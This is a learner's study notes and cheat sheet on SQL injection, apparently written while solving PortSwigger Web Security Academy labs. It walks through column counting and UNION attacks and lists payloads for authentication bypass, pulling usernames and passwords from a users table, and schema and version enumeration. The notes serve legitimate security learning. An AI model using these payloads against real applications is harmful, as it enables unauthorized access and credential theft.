# Notes — SQL Injection

SQL Injection — Notes, Thought Process & Cheat Sheet

Author: Divine Platform: PortSwigger Web Security Academy


---

🧠 My Thought Process When Solving SQL Injection Labs

Whenever I approach a SQL injection lab, I follow a structured mental checklist instead of guessing.

1️⃣ Check for Vulnerability

I first test whether the input is vulnerable to SQL injection.

Common payloads:

'
''
'--

If the application returns an error or behaves differently, the input is likely injectable.


---

2️⃣ Understand the Goal of the Lab

Before attacking, I ask:

Am I retrieving hidden data?

Am I bypassing authentication?

Am I extracting data from other tables?


Understanding the goal prevents random payload usage.


---

3️⃣ Determine the Number of Columns

For UNION-based SQL injection, the number of columns must match.

I use the ORDER BY technique:

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

When an error appears, the previous number is the correct column count.


---

4️⃣ Identify String-Compatible Columns

Once the number of columns is known, I check which columns can hold string data.

Example for 3 columns:

' UNION SELECT 'abc', NULL, NULL --
' UNION SELECT NULL, 'abc', NULL --
' UNION SELECT NULL, NULL, 'abc' --

If the string is reflected or no error occurs, that column accepts string values.


---

5️⃣ Perform the Actual UNION Attack

After identifying valid columns, I inject meaningful data such as:

Required strings (lab tasks)

Database information

User credentials



---

💣 Common SQL Injection Payloads

🔹 Retrieve All Rows

' OR 1=1 --

🔹 Comment Out the Rest of the Query

--
#

🔹 Authentication Bypass

Administrator' --
' OR '1'='1' --


---

🔗 UNION-Based SQL Injection Payloads

Find Number of Columns

' ORDER BY 1 --

Basic UNION Template

' UNION SELECT NULL, NULL --

(Add NULLs until column count matches)

Retrieve Data from Another Table

' UNION SELECT username, password FROM users --


---

🗄️ Database Enumeration Examples

🔹 MySQL / PostgreSQL

UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

🔹 Oracle (Version Enumeration)

UNION SELECT banner, NULL FROM v$version --


---

⚠️ Important Concepts to Remember

UNION queries must return the same number of columns

Data types must be compatible (strings vs integers)

Error messages are valuable information

Labs may provide table/column names — real apps usually don’t

Enumeration comes before exploitation



---

🧩 Real-World Notes

In real applications:

Table and column names are discovered via enumeration

Error-based SQL injection leaks schema details

Guessing common names is often effective


PortSwigger labs focus on teaching one concept at a time, which is why some information is given upfront.


---

🏁 Final Reflection

SQL injection is not about memorizing payloads. It is about:

Logic

Structure

Patience

Methodical testing


As long as I follow the process, the vulnerability becomes clear.


---

🔥 This cheat sheet will be updated as I continue learning more advanced SQL injection techniques.
